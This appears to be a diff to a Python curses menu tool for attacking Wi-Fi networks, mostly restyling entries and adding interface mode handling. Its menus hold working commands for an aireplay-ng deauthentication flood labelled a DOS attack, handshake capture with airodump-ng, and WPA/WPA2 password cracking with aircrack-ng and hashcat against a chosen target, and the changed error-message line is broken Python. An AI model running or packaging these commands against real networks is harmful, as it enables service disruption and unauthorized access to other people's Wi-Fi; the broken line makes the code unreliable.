@@ -31,13 +31,14 @@ interfaces = netifaces.interfaces()
 selected_interface = ""
 interface_mode = ""
 target = ""
-target_BSSID =""
-interface_mac=""
-target_channel=""
-capture_file="\"cap/AXTEL XTREMO-3E6E_62:02:71:88:3E:6F-01.cap\""
-password_list="dictionary/axtel.txt"
+target_BSSID = ""
+interface_mac = ""
+target_channel = ""
+capture_file = "\"cap/AXTEL XTREMO-3E6E_62:02:71:88:3E:6F-01.cap\""
+password_list = "dictionary/axtel.txt"
 list2 = []
 
+# function to refresh all interfaces availables
 def refresh_options_list2():
   global list2
   global interfaces
@@ -48,9 +49,7 @@ def refresh_options_list2():
 
 refresh_options_list2()
 
-#crates an empty menu data
-menu_data = {}
-#function to set the data of the menu, called everytime data changes
+# function to see all networks available
 def getObjectives(interface):
   cell = list(Cell.all(interface))
   body = []
@@ -69,6 +68,9 @@ def getObjectives(interface):
     body.append(row)
   return body
 
+#crates an empty menu data
+menu_data = {}
+#function to set the data of the menu, called everytime data changes
 def set_data():
     global menu_data
     global list2
@@ -78,18 +80,18 @@ def set_data():
         { 'title': "Put interface in monitor mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng start ' + selected_interface, 'status': 'monitor' },
         { 'title': "Put interface in managed mode", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng stop ' + selected_interface, 'status': 'managed' },
         { 'title': "Fix network issues", 'type': MAINCOMMAND, 'command': 'sudo airmon-ng check kill \n sudo service NetworkManager restart', 'status': 'null' },
-        { 'title': "Select Wifi target", 'type': WIFISEL, 'subtitle': "selected target: " + target, 'options': wifilist },
-        { 'title': "DOS attack menu", 'type': MENU, 'subtitle': "DOS attak menu", 'options': [
-          {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
+        { 'title': "Select Wifi target", 'type': WIFISEL, 'subtitle': "Selected target: " + target, 'options': wifilist },
+        { 'title': "DOS attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
+          {'title': "DEAUTH", 'type': COMMAND, 'command': 'watch -n 3 sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface },
         ]},
         { 'title': "Handshake/PMKID tools menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
-          {'title': "capture handshake with airplay", 'type': COMMAND, 'command': 'sudo airodump-ng -c '+ target_channel + ' --bssid ' + target_BSSID + ' -w ' + 'cap/' + "\"" + target + "\"" + '_' + target_BSSID + ' ' +  selected_interface + "mon\n" 'sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface + 'mon' },
+          {'title': "Capture handshake with airplay", 'type': COMMAND, 'command': 'sudo airodump-ng -c '+ target_channel + ' --bssid ' + target_BSSID + ' -w ' + 'cap/' + "\"" + target + "\"" + '_' + target_BSSID + ' ' +  selected_interface + "mon\n" 'sudo aireplay-ng --deauth 1000 -a ' + target_BSSID + ' -h ' + interface_mac + " " + selected_interface },
         ]},
         { 'title': "Offline WPA/WPA2 cracking menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
-          {'title': "select capture file", 'type': COMMAND, 'command': ''  },
-          {'title': "select dictionary file file", 'type': COMMAND, 'command': ''  },
-          {'title': "aircrack", 'type': COMMAND, 'command': 'aircrack-ng -w ' + password_list + ' -b ' + target_BSSID + ' ' + capture_file + ' -l ' + target + '.pswd'  },
-          {'title': "hashcat", 'type': COMMAND, 'command': 'hashcat -m 2500 -o ' + password_list + ' ' + capture_file  },
+          {'title': "Select capture file", 'type': COMMAND, 'command': ''  },
+          {'title': "Select dictionary file file", 'type': COMMAND, 'command': ''  },
+          {'title': "Aircrack", 'type': COMMAND, 'command': 'aircrack-ng -w ' + password_list + ' -b ' + target_BSSID + ' ' + capture_file + ' -l ' + target + '.pswd'  },
+          {'title': "Hashcat", 'type': COMMAND, 'command': 'hashcat -m 2500 -o ' + password_list + ' ' + capture_file  },
         ]},
 		    { 'title': "Evil Twin attack menu", 'type': MENU, 'subtitle': "DOS attack menu", 'options': [
           {'title': "NO", 'type': EXITMENU, },
@@ -258,6 +260,11 @@ def processmenu(menu, parent = None):
     
     elif menu['options'][getin]['type'] == INTSEL:
       #errorMessage({"status": 200, "description": "Hello World"}, screen, curses)
+      is_monitor = selected_interface[-3:]
+      if is_monitor == 'mon':
+        os.system('sudo airmon-ng stop ' + selected_interface)
+        selected_interface = selected_interface.replace('mon', '')
+        os.system('sudo ifconfig ' + selected_interface + ' up')
       selected_interface = menu['options'][getin]['command']
       is_monitor = selected_interface[-3:]
       if is_monitor == 'mon':
@@ -279,7 +286,7 @@ def errorMessage(errorCode, clearScreen, pressKey):
   clearScreen.clear()
   clearScreen.refresh()
   print('')
-  print(str(errorCode["status"]) + ': ' + errorCode["description"] + ', press any key to continue...')
+  print('Error code 'str(errorCode["status"]) + ': ' + errorCode["description"] + ', press any key to continue...')
   pressKey.initscr().getch()
 
 # Main program
